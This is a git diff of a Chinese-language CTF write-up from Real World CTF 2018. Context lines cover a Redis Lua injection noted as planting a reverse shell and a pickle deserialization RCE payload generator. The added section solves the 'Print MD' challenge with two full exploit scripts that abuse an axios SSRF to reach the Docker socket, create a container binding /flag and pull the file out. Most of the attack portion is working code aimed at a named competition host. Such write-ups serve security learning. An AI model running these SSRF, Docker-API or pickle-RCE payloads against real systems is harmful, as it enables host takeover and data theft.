@@ -10,7 +10,7 @@ tags: ctf
 
 1. ip2long
 
-   ```python
+   ```
    ip_addr='192.168.2.10'
    
    # transfer ip to int
@@ -20,7 +20,6 @@ tags: ctf
        for i in range(4):  #0,1,2,3
            result=result+int(ip_list[i])*256**(3-i)
        return result
-   
    
    long=3232236042
    
@@ -33,8 +32,6 @@ tags: ctf
            floor_list.append(str(res[0]))
            yushu=res[1]
        return '.'.join(floor_list)
-   
-   
    
    a=long2ip(long)
    print(a)
@@ -110,7 +107,7 @@ tags: ctf
 
 2. 进入代码查看
 
-   ```python
+   ```
    def get_remote_addr():
        address = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)
    
@@ -128,7 +125,7 @@ tags: ctf
 
    发现该服务运行于debug模式下
 
-   ```python
+   ```
    @login_required
    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
    def refresh_session():
@@ -177,11 +174,11 @@ tags: ctf
 
 5. 添加csrf_token
 
-   ![/images/realworldctf/TIM截图20180801195906.png]()
+   ![](/images/realworldctf/TIM截图20180801195906.png)
 
 6. 漏洞
 
-   ```python
+   ```
    local inputs = {{ "{prefix}{sessionid}" }}
    local sessions = redis.call("keys", "{prefix}*")
    ```
@@ -217,11 +214,11 @@ tags: ctf
 
 10. evil code
 
-   > redis.call("set","bookhub:session:tianji",反弹shell) 
+  > redis.call("set","bookhub:session:tianji",反弹shell) 
 
 11. payload
 
-    ```python
+    ```
     import cPickle
     import os
     import requests
@@ -283,15 +280,13 @@ tags: ctf
 
     收到响应。
 
-    ![/images/realworldctf/TIM截图20180802110118.png]()
+    ![](/images/realworldctf/TIM截图20180802110118.png)
 
 12. 修改payload，获取flag
 
     payload1:
 
-    ```python
-    # -*- coding:utf-8 -*-
-    
+    ```
     import requests
     import re
     import json
@@ -364,8 +359,7 @@ tags: ctf
 
     payload2:
 
-    ```python
-    # -*- coding:utf-8 -*-
+    ```
     __AUTHOR__ = 'Virink'
     
     import os
@@ -415,7 +409,7 @@ tags: ctf
 
 13. pickle payload生成
 
-    ```python
+    ```
     #!/usr/bin/python
     #
     # Pickle deserialization RCE payload.
@@ -438,7 +432,245 @@ tags: ctf
     print base64.b64encode(cPickle.dumps(PickleRce()))
     ```
 
-    
+### Print MD
+
+1. subject description
+
+   ```
+   Make HackMD printable ._. http://54.183.55.10/
+   
+   Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag
+   
+   Hint: Here is a render.js for you.
+   ```
+
+2. render.js
+
+   ```
+   const {Router} = require('express')
+   const {matchesUA} = require('browserslist-useragent')
+   const router = Router()
+   const axios = require('axios')
+   const md = require('../../plugins/md_srv')
+   
+   router.post('/render', function (req, res, next) {
+     let ret = {}
+     ret.ssr = !matchesUA(req.body.ua, {
+       browsers: ["last 1 version", "> 1%", "IE 10"],
+       _allowHigherVersions: true
+     });
+     if (ret.ssr) {
+       axios(req.body.url).then(r => {
+             ret.mdbody = md.render(r.data)
+         res.json(ret)
+       })
+     }
+     else {
+       ret.mdbody = md.render('# 请稍候…')
+       res.json(ret)
+     }
+   });
+   module.exports = router
+   ```
+
+3. 漏洞
+
+   **print.ba84889093b992d33112.js**中可以找到将markdown文档发送到服务端解析的代码 
+
+   ```
+   validate: function(e) {
+       return e.query.url && e.query.url.startsWith("https://hackmd.io/")
+   },
+   asyncData: function(ctx) {
+       if(!ctx.query.url.endsWith("/download")){
+           ctx.query.url += "/download";
+       }
+       ctx.query.ua = ctx.req.headers["user-agent"] || "";
+       return axios.post("/api/render", qs.stringify({...ctx.query})).then(function(e) {
+           return {
+               ...e.data,
+               url: ctx.query.url
+           }
+       })
+   },
+   mounted: function() {
+       if (!this.ssr){
+           axios(this.url).then(function(t) {
+               this.mdbody = md.render(t.data)
+           })
+       }
+   }
+   ```
+
+   这里直接使用`qs.stringify({...ctx.query}`,因而在render.js中
+
+   ```js
+   axios(req.body.url).then(r => {
+       ret.mdbody = md.render(r.data)
+       res.json(ret)
+   }
+   ```
+
+   `req.body.url` 可控
+
+4. 漏洞利用
+
+   **axios**这个东西是不支持**file://**协议的，但是通过文档可知，他支持**UNIX Socket** 。
+
+   ![](/images/realworldctf/TIM截图20180802194917.png)
+
+   测试`ping`。
+
+   > GET http://54.183.55.10/print?url[url]=/_ping&url[socketPath]=/var/run/docker.sock&url=https://hackmd.io/ HTTP/1.1
+
+   ![](/images/realworldctf/TIM截图20180802195456.png)
+
+5. exploit.py
+
+   ```python
+   import requests as req
+   import random
+   import string
+   from bs4 import BeautifulSoup
+   from urllib import quote as urlencode
+   
+   URL = "http://54.183.55.10/print?{url}&url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ"
+   
+   headers = {
+       "User-Agent": "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+   }
+   
+   
+   def get(u):
+       res = req.get(u, timeout=10, headers=headers)
+       if res.status_code == 200:
+           soup = BeautifulSoup(res.content, "lxml")
+           body = soup.select(".markdown-body")
+           if body:
+               print(body[0].text)
+               return True
+       print("[-] error")
+   
+   
+   def fuck(_u):
+       _u += '&url[socketPath]=/var/run/docker.sock'
+       pl = URL.format(url=_u)
+       try:
+           get(pl)
+       except:
+           pass
+   
+   if __name__ == '__main__':
+       container_name = ''.join(random.sample(
+           string.ascii_letters + string.digits, 6))
+       _us = [
+           'url[url]=/_ping&',
+           'url[method]=post&url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest',
+           'url[method]=post&url[url]=http://127.0.0.1/containers/create?name=%s&url[data][Image]=alpine:latest&url[data][Volumes][flag][path]=/getflag&url[data][Binds][]=/flag:/getflag:ro&url[data][Entrypoint][]=/bin/ls' % container_name,
+           'url[method]=post&url[url]=http://127.0.0.1/containers/%s/start' % container_name,
+           'url[method]=get&url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name
+       ]
+       for i in _us:
+           fuck(i)
+   ```
+
+   exploit1.py
+
+   ```
+   #!/usr/bin/env python
+   # -*- coding: utf-8 -*-
+   #
+   # SakiiR @ Hexpresso
+   # cc XeR & BitK
+   # Let's go now (:
+   #
+   # --+ Python 2 +--
+   
+   import random
+   import pwn
+   import requests
+   import urllib
+   
+   urlencode = urllib.quote_plus
+   
+   OUTFILE = "flag.txt"
+   MAX_ROWS = 100
+   
+   
+   def random_container_name(n=10, charset=("abcdefghijklmnopqrstUVWXYZ"
+                                            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                                            "0123456789")):
+       return ''.join([
+           charset[random.randint(0, len(charset) - 1)] for _ in range(n)
+       ])
+   
+   
+   def main():
+   
+       container_name = random_container_name()
+       pwn.log.info("Your container name is '{}'".format(container_name))
+   
+       # Pull alpine image :)
+       # --------------------
+       endpoint = urlencode("http://127.0.0.1/images/create?fromImage=alpine:latest")
+       url = ('http://54.183.55.10/print'
+              '?url[method]=POST'
+              '&url[url]={}'
+              '&url[socketPath]=/var/run/docker.sock'
+              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
+       pwn.log.info("Pulling alpine:      '{}[...]'".format(url[:MAX_ROWS]))
+       r = requests.get(url)
+       pwn.log.info("Response: {}".format(r.status_code))
+   
+       # Creating container (image)
+       # --------------------------
+       endpoint = urlencode('http://127.0.0.1/containers/create?name={}'.format(container_name))
+       url = ('http://54.183.55.10/print'
+              '?url[method]=POST'
+              '&url[url]={}'
+              '&url[data][Volumes][flag][path]=/sakiir'
+              '&url[data][Binds][]=/flag:/sakiir:ro'
+              '&url[data][Entrypoint][]=/bin/sh'
+              '&url[data][Image]=alpine:latest'
+              '&url[socketPath]=/var/run/docker.sock'
+              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
+       pwn.log.info("Creating container:  '{}[...]'".format(url[:MAX_ROWS]))
+       pwn.log.info("This will take some time then crash with a 503")
+       pwn.log.info("The container will still be created (:")
+       r = requests.get(url)
+       pwn.log.info("Response: {}".format(r.status_code))
+   
+       # Starting container_name
+       # -----------------------
+       endpoint = urlencode('http://127.0.0.1/containers/{}/start'.format(container_name))
+       url = ('http://54.183.55.10/print'
+              '?url[method]=POST'
+              '&url[url]={}'
+              '&url[socketPath]=/var/run/docker.sock'
+              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
+       pwn.log.info("Starting container:  '{}[...]'".format(url[:MAX_ROWS]))
+       r = requests.get(url)
+       pwn.log.info("Response: {}".format(r.status_code))
+   
+       # Archive container (Archive the /sakiir directory and get it back :))
+       # --------------------------------------------------------------------
+       endpoint = urlencode("http://127.0.0.1/containers/{}/archive?path=/sakiir".format(container_name))
+       url = ('http://54.183.55.10/print'
+              '?url[method]=GET'
+              '&url[url]={}'
+              '&url[socketPath]=/var/run/docker.sock'
+              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)
+       pwn.log.info("Archiving container: '{}[...]'".format(url[:MAX_ROWS]))
+       r = requests.get(url)
+       pwn.log.info("Response: {}".format(r.status_code))
+       with open(OUTFILE, 'w') as f:
+           f.write(r.content)
+           pwn.log.info("Flag written to file '{}'".format(OUTFILE))
+   
+   
+   if __name__ == '__main__':
+       main()
+   ```
 
 ## pwn
 
